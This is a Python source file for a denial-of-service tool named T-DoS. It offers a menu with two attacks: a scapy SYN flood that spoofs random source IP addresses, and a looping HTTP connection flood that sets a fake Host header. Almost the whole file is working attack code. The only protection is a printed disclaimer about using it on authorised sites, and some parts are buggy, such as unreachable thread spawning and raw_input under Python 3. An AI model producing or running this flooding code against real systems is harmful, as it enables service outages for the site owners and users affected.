from os import system
from sys import stdout
from scapy.all import *
from random import randint
import os
from concurrent.futures import thread
import socket
import threading
import time
fake_ip = '44.197.175.168'
attack_num = 0
def attack(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()
    for i in range(500):
        thread = threading.Thread(target = attack)
        thread.start()

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Sending packets...")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1

	stdout.write("\nTotal packets sent: %i\n" % total)


def main():
    os.system("clear")
    print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
    print("Use this tool only on your own website or websites from which you have obtained permission.")
    time.sleep(5)
    os.system("clear")
    os.system("toilet T-DoS")
    print("Coded By: ParzivalHack")
    print("Github: https://github.com/ParzivalHack")
    print("      [Menu]      ")
    print("1) SYN Flood")
    print("2) HTTP Flood")
    option = int(input("Choose an option: "))
    print(option)
    if option == 1:
        os.system("clear")
        dstIP = raw_input("Target IP: ")
        dstPort = int(input("Target Port: "))
        counter = int(input("Packets to send: "))
        SYN_Flood(dstIP,dstPort,int(counter))
    elif option == 2:
        os.system("clear")
        target = input("Insert Target: ")
        port = int(input("Insert Port: "))
        attack(target, port)


if __name__ == "__main__":
    main()
